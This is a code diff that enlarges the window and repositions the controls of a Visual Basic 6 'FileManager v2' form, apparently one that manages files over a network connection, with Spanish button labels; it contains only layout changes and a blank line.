@@ -6,23 +6,23 @@ Begin VB.Form fmanager
    BackColor       =   &H00FFFFFF&
    BorderStyle     =   1  'Fixed Single
    Caption         =   "FileManager v2"
-   ClientHeight    =   9105
+   ClientHeight    =   12075
    ClientLeft      =   7770
    ClientTop       =   3180
-   ClientWidth     =   10860
+   ClientWidth     =   13335
    LinkTopic       =   "Form5"
    MaxButton       =   0   'False
    MinButton       =   0   'False
-   ScaleHeight     =   9105
-   ScaleWidth      =   10860
+   ScaleHeight     =   12075
+   ScaleWidth      =   13335
    StartUpPosition =   2  'CenterScreen
    Begin VB.CommandButton Command2 
       Caption         =   "&Subir"
       Height          =   255
-      Left            =   9360
+      Left            =   9480
       TabIndex        =   11
       Top             =   120
-      Width           =   615
+      Width           =   855
    End
    Begin VB.CommandButton Command7 
       Caption         =   "&PC"
@@ -77,9 +77,9 @@ Begin VB.Form fmanager
       Height          =   255
       Left            =   120
       TabIndex        =   4
-      Top             =   8760
-      Width           =   10575
-      _ExtentX        =   18653
+      Top             =   11760
+      Width           =   13095
+      _ExtentX        =   23098
       _ExtentY        =   450
       BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
          Name            =   "MS Sans Serif"
@@ -96,10 +96,10 @@ Begin VB.Form fmanager
    Begin VB.CommandButton Command3 
       Caption         =   "&Cerrar"
       Height          =   255
-      Left            =   10080
+      Left            =   12240
       TabIndex        =   3
       Top             =   120
-      Width           =   615
+      Width           =   855
    End
    Begin ACTIVESKINLibCtl.Skin Skin1 
       Left            =   8520
@@ -127,13 +127,13 @@ Begin VB.Form fmanager
       Width           =   3015
    End
    Begin MSComctlLib.ListView arch 
-      Height          =   8175
+      Height          =   11055
       Left            =   120
       TabIndex        =   0
       Top             =   480
-      Width           =   10575
-      _ExtentX        =   18653
-      _ExtentY        =   14420
+      Width           =   13095
+      _ExtentX        =   23098
+      _ExtentY        =   19500
       View            =   3
       LabelWrap       =   -1  'True
       HideSelection   =   -1  'True
@@ -466,6 +466,7 @@ Else
 End If
 
 End Sub
+
 
 Private Sub Command6_Click()
 If Form1.Winsock1(vIndex(0)).state = sckConnected Then
